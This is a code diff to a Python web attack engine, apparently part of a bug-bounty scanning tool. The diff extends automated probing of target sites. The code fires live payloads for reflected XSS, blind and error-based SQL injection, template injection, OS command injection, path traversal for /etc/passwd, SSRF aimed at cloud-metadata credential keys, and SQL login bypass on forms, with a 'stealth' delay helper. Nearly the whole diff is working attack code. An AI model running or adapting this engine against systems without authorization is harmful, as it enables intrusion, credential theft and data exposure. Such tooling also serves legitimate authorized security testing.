@@ -2137,6 +2137,28 @@ def _extract_query_params(url):
             out.append(kv.split("=")[0])
     return out
 
+def _attack_params_for(url):
+    """Params to attack on a URL. If the URL already carries query params use
+    them; otherwise synthesize a small, path-relevant param set so attacks run
+    even when recon produced bare URLs (the engine injects its own inputs)."""
+    existing = _extract_query_params(url)
+    if existing:
+        return existing
+    pl = url.lower()
+    if any(k in pl for k in ("login", "signin", "auth")):
+        return ["username", "email", "login"]
+    if any(k in pl for k in ("search", "query", "lookup", "find")):
+        return ["q", "query", "search", "term", "id", "uid"]
+    if any(k in pl for k in ("download", "file", "read", "view", "export", "include", "page", "item", "report")):
+        return ["file", "path", "name", "page", "view", "id", "report_id"]
+    if any(k in pl for k in ("fetch", "proxy", "redirect", "callback", "webhook", "preview", "load")):
+        return ["url", "link", "uri", "target", "redirect", "next"]
+    if any(k in pl for k in ("ping", "trace", "diag", "tool", "whois", "nslookup", "dns")):
+        return ["host", "ip", "domain", "target", "addr"]
+    if any(k in pl for k in ("template", "render", "preview", "tpl", "html")):
+        return ["t", "template", "tmpl", "name", "view", "content"]
+    return ["id", "q", "url", "name", "email", "page", "username", "file", "host", "target"]
+
 def _extract_forms(body, base_url):
     """Pull (action, method, fields) from HTML forms for POST testing."""
     forms = []
@@ -2165,6 +2187,22 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
     t0 = _time.time()
     deadline = t0 + timeout
     api_eps = list(api_eps or [])
+    probes = [0]
+    MAX_PROBES = 2400
+    PHASES = 9
+
+    def _budget(phase=None):
+        if probes[0] >= MAX_PROBES:
+            return False
+        if _time.time() >= deadline:
+            return False
+        if phase is not None:
+            # per-phase ceiling: don't let one attack type consume everything
+            return probes[0] < (MAX_PROBES // PHASES) * (phase + 1)
+        return True
+
+    def _spend():
+        probes[0] += 1
 
     # ── Build attack surface ──────────────────────────────────────
     hosts = set()
@@ -2180,28 +2218,42 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
         except Exception:
             pass
 
-    # candidate base URLs: live URLs + common paths on each host + API eps
+    # candidate base URLs: live URLs + common paths on each host + API eps.
+    # Inherit the scheme actually seen for each host so we don't waste budget
+    # probing e.g. https common-paths against an HTTP-only target.
+    host_schemes = {}
+    for u in (urls or []):
+        try:
+            p = urllib.parse.urlparse(u)
+            host_schemes.setdefault(p.netloc, p.scheme)
+        except Exception:
+            pass
     bases = set()
     for u in (urls or [])[:40]:
         bases.add(u)
     for h in list(hosts)[:12]:
-        for scheme in ("https", "http"):
-            bases.add(f"{scheme}://{h}/")
+        scheme = host_schemes.get(h, "https")
+        bases.add(f"{scheme}://{h}/")
     for p in _ATTACK_COMMON_PATHS:
         for h in list(hosts)[:8]:
-            for scheme in ("https",):
-                bases.add(f"{scheme}://{h}{p}")
+            scheme = host_schemes.get(h, "https")
+            bases.add(f"{scheme}://{h}{p}")
     for ep in api_eps[:40]:
         if ep.startswith("/"):
             for h in list(hosts)[:4]:
-                bases.add(f"https://{h}{ep}")
+                scheme = host_schemes.get(h, "https")
+                bases.add(f"{scheme}://{h}{ep}")
         elif "://" in ep:
             bases.add(ep)
 
     # dedupe + drop obvious file/static refs
     urls_todo = []
     seen = set()
-    for u in sorted(bases):
+    # Real discovered/live URLs first (they carry actual parameters and
+    # handlers), then generated common paths. Probe budget is spent on the
+    # most promising endpoints before generic paths.
+    ordered = (list(urls or [])[:40] + sorted(bases))
+    for u in ordered:
         if u in seen:
             continue
         seen.add(u)
@@ -2228,39 +2280,40 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
         if f not in findings:
             findings.append(f)
 
-    # 1) Reflected XSS on GET + POST params
+    # 1) Reflected XSS on GET + POST params.
+    # A unique random marker is embedded in each payload so reflection is
+    # detected only when the EXACT payload is echoed back (no false positives
+    # from quote characters that appear in every HTML response).
     xss_payloads = [
         '<script>alert(document.domain)</script>',
         '<img src=x onerror=alert(1)>',
-        '"><svg/onload=alert(1)>',
+        '<svg/onload=alert(1)>',
         "'-alert(1)-'",
         'javascript:alert(1)//',
     ]
     for u in urls_todo:
-        if _time.time() > deadline:
+        if not _budget(0):
             break
-        params = _extract_query_params(u)
-        if not params:
-            continue
+        params = _attack_params_for(u)
         base = u.split("?")[0]
         for p in params:
             for payload in xss_payloads:
-                if _time.time() > deadline:
+                if not _budget(0):
                     break
-                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
+                _spend()
+                marker = "XSS" + "".join(random.choices(string.ascii_lowercase, k=8))
+                test_url = f"{base}?{p}={urllib.parse.quote(marker + payload, safe='')}"
                 try:
                     st, _, body = http_get_retry(test_url, timeout=5)
                 except Exception:
                     continue
-                if st == 200 and body:
-                    lc = body.lower()
-                    if payload.lower().split(">")[0][-20:] in lc or "alert(1)" in lc or "alert(document.domain)" in lc:
-                        _record("Reflected XSS", test_url, payload,
-                                f"payload reflected in HTTP {st} response",
-                                "high", "CWE-79",
-                                title="Reflected Cross-Site Scripting",
-                                extra={"method": "GET", "param": p})
-                        break
+                if st == 200 and body and marker in body:
+                    _record("Reflected XSS", test_url, payload,
+                            f"unique marker '{marker}' + payload reflected verbatim in HTTP {st} response",
+                            "high", "CWE-79",
+                            title="Reflected Cross-Site Scripting",
+                            extra={"method": "GET", "param": p, "marker": marker})
+                    break
                 stealth.small_sleep()
 
     # 2) SQLi: error-based markers (GET)
@@ -2271,16 +2324,15 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
         ("1' AND 1=1-- -", "sql|syntax error|odbc"),
     ]
     for u in urls_todo:
-        if _time.time() > deadline:
+        if not _budget(1):
             break
-        params = _extract_query_params(u)
-        if not params:
-            continue
+        params = _attack_params_for(u)
         base = u.split("?")[0]
         for p in params:
             for payload, marker_re in sqli_payloads:
-                if _time.time() > deadline:
+                if not _budget(1):
                     break
+                _spend()
                 test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                 try:
                     st, _, body = http_get_retry(test_url, timeout=5)
@@ -2295,28 +2347,29 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
                     break
                 stealth.small_sleep()
 
-    # 3) SQLi time-based blind (GET) — robust without any error reflection
+    # 3) SQLi time-based blind (GET) — robust without any error reflection.
+    # Only probes DB-like params to keep the scan fast on large surfaces.
     time_payloads = [
         "' OR SLEEP(4)-- -",
-        "' OR pg_sleep(4)-- -",
         "'; WAITFOR DELAY '0:0:4';--",
-        "1 AND SLEEP(4)",
     ]
+    db_param_hints = ("id", "uid", "q", "query", "search", "term", "keywords", "page", "offset", "limit", "num", "no", "user", "username", "email", "name", "category", "type", "status")
     for u in urls_todo:
-        if _time.time() > deadline:
+        if not _budget(2):
             break
-        params = _extract_query_params(u)
-        if not params:
-            continue
+        params = _attack_params_for(u)
         base = u.split("?")[0]
         for p in params:
+            if not any(h in p.lower() for h in db_param_hints):
+                continue
             for payload in time_payloads:
-                if _time.time() > deadline:
+                if not _budget(2):
                     break
+                _spend()
                 test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                 try:
                     t_start = _time.time()
-                    st, _, _ = http_get_retry(test_url, timeout=8)
+                    st, _, _ = http_get_retry(test_url, timeout=6)
                     elapsed = _time.time() - t_start
                 except Exception:
                     continue
@@ -2338,9 +2391,9 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
         ("<%= 7*7 %>", "49"),
     ]
     for u in urls_todo:
-        if _time.time() > deadline:
+        if not _budget(3):
             break
-        params = _extract_query_params(u)
+        params = _attack_params_for(u)
         base = u.split("?")[0]
         candidates = []
         for p in params:
@@ -2348,8 +2401,9 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
         # also try template/name/echo-ish params on POST forms later
         for prefix, p in candidates:
             for payload, marker in ssti_payloads:
-                if _time.time() > deadline:
+                if not _budget(3):
                     break
+                _spend()
                 test_url = prefix + urllib.parse.quote(payload, safe="")
                 try:
                     st, _, body = http_get_retry(test_url, timeout=5)
@@ -2374,18 +2428,17 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
     ]
     cmdi_param_hints = ("host", "ip", "domain", "target", "addr", "ping", "dns", "nslookup", "whois", "cmd", "exec", "shell", "tool", "diag", "traceroute", "command")
     for u in urls_todo:
-        if _time.time() > deadline:
+        if not _budget(4):
             break
-        params = _extract_query_params(u)
-        if not params:
-            continue
+        params = _attack_params_for(u)
         base = u.split("?")[0]
         for p in params:
             if not any(h in p.lower() for h in cmdi_param_hints):
                 continue
             for payload, marker in cmdi_payloads:
-                if _time.time() > deadline:
+                if not _budget(4):
                     break
+                _spend()
                 test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                 try:
                     st, _, body = http_get_retry(test_url, timeout=5)
@@ -2400,30 +2453,30 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
                     break
                 stealth.small_sleep()
 
-    # 5b) Command injection time-based (blind, any param)
+    # 5b) Command injection time-based (blind, cmd-ish params only)
     cmdi_time_payloads = [
         "|sleep 4",
         ";sleep 4",
         "$(sleep 4)",
         "`sleep 4`",
-        "%0asleep 4",
         "& ping -c 4 127.0.0.1 &",
     ]
     for u in urls_todo:
-        if _time.time() > deadline:
+        if not _budget(5):
             break
-        params = _extract_query_params(u)
-        if not params:
-            continue
+        params = _attack_params_for(u)
         base = u.split("?")[0]
         for p in params:
+            if not any(h in p.lower() for h in cmdi_param_hints):
+                continue
             for payload in cmdi_time_payloads:
-                if _time.time() > deadline:
+                if not _budget(5):
                     break
+                _spend()
                 test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                 try:
                     t_start = _time.time()
-                    st, _, _ = http_get_retry(test_url, timeout=8)
+                    st, _, _ = http_get_retry(test_url, timeout=6)
                     elapsed = _time.time() - t_start
                 except Exception:
                     continue
@@ -2446,18 +2499,19 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
     ]
     traversal_markers = ("root:x:0:0:", "daemon:x:1:1:")
     for u in urls_todo:
-        if _time.time() > deadline:
+        if not _budget(6):
             break
-        params = _extract_query_params(u)
+        params = _attack_params_for(u)
         pl = u.lower()
-        if not params and not any(k in pl for k in ("download", "file", "read", "view", "static", "export", "backup", "attachment", "content", "page", "include")):
+        if not _extract_query_params(u) and not any(k in pl for k in ("download", "file", "read", "view", "static", "export", "backup", "attachment", "content", "page", "include")):
             continue
         base = u.split("?")[0]
         param_list = params or ["file", "path", "name", "filename", "download", "page", "view", "content"]
         for p in param_list:
             for payload in traversal_payloads:
-                if _time.time() > deadline:
+                if not _budget(6):
                     break
+                _spend()
                 test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                 try:
                     st, _, body = http_get_retry(test_url, timeout=5)
@@ -2481,22 +2535,23 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
     ]
     ssrf_param_hints = ("url", "link", "uri", "u", "target", "src", "dest", "host", "redirect", "callback", "webhook", "load", "fetch", "proxy", "img", "image")
     for u in urls_todo:
-        if _time.time() > deadline:
+        if not _budget(7):
             break
-        params = _extract_query_params(u)
+        params = _attack_params_for(u)
         base = u.split("?")[0]
         for p in params:
             if not any(h in p.lower() for h in ssrf_param_hints):
                 continue
             for payload in ssrf_payloads:
-                if _time.time() > deadline:
+                if not _budget(7):
                     break
+                _spend()
                 test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                 try:
                     st, _, body = http_get_retry(test_url, timeout=6)
                 except Exception:
                     continue
-                if body and any(m in body for m in ("MRBOOM_LAB", "crown_jewels", "acme-internal", "instance-id", "public-ipv4", "ami-id")):
+                if body and any(m in body for m in ("MRBOOM_LAB", "crown_jewels", "acme-internal", "instance-id", "public-ipv4", "ami-id", "iam-role-arn", "role-arn", "AccessKeyId", "SecretAccessKey", "170.170.170.170")):
                     _record("SSRF (Server-Side Request Forgery)", test_url, payload,
                             "internal/cloud-metadata content marker in response",
                             "high", "CWE-918",
@@ -2508,8 +2563,9 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
     # 8) POST-form attack pass: SQLi auth bypass, XSS, SSTI on form fields
     form_seen = set()
     for u in urls_todo[:30]:
-        if _time.time() > deadline:
+        if not _budget(8):
             break
+        _spend()
         try:
             st, _, body = http_get_retry(u, timeout=5)
         except Exception:
@@ -2525,12 +2581,15 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
                 continue
             if not fields:
                 continue
-            # SQLi auth bypass
-            uname_field = next((f for f in fields if any(k in f.lower() for k in ("user", "email", "login", "account"))), fields[0])
-            pwd_field = next((f for f in fields if any(k in f.lower() for k in ("pass", "pwd"))), fields[-1] if len(fields) > 1 else fields[0])
+            # SQLi auth bypass (only on real login forms with a password field)
+            pwd_field = next((f for f in fields if any(k in f.lower() for k in ("pass", "pwd"))), None)
+            uname_field = next((f for f in fields if any(k in f.lower() for k in ("user", "email", "login", "account"))), None)
+            if pwd_field is None or uname_field is None:
+                continue
             for payload in ("admin' OR '1'='1'-- -", "' OR 1=1-- -", "admin'--"):
-                if _time.time() > deadline:
+                if not _budget(8):
                     break
+                _spend()
                 data = urllib.parse.urlencode({uname_field: payload, pwd_field: "pwned", **{f: "1" for f in fields if f not in (uname_field, pwd_field)}})
                 try:
                     st2, _, body2 = _http_post(action, data, timeout=6)
@@ -2545,16 +2604,18 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
                     break
                 stealth.small_sleep()
             # XSS on first text-ish field
-            for payload in ("<script>alert(document.domain)</script>", "><svg/onload=alert(1)>"):
-                if _time.time() > deadline:
+            for payload in ("<script>alert(document.domain)</script>", "<svg/onload=alert(1)>"):
+                if not _budget(8):
                     break
+                _spend()
                 target = next((f for f in fields if f not in (pwd_field,)), fields[0])
-                data = urllib.parse.urlencode({target: payload, pwd_field: "x", **{f: "1" for f in fields if f not in (target, pwd_field)}})
+                marker = "XSS" + "".join(random.choices(string.ascii_lowercase, k=8))
+                data = urllib.parse.urlencode({target: marker + payload, pwd_field: "x", **{f: "1" for f in fields if f not in (target, pwd_field)}})
                 try:
                     st2, _, body2 = _http_post(action, data, timeout=6)
                 except Exception:
                     continue
-                if body2 and ("alert(1)" in body2 or "alert(document.domain)" in body2):
+                if body2 and marker in body2:
                     _record("Reflected XSS (POST)", action, payload,
                             "XSS payload reflected in POST response",
                             "high", "CWE-79",
@@ -2564,6 +2625,8 @@ def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
                 stealth.small_sleep()
 
     return findings
+
+def bb_js_assets(urls, timeout=30):
     """Deep JS asset analysis: fetch every script on the page, extract API
     endpoints, hardcoded secrets/keys, GraphQL queries, and third-party SDK
     hosts. Goes beyond naive regex by pulling sourceMappingURL sources too."""
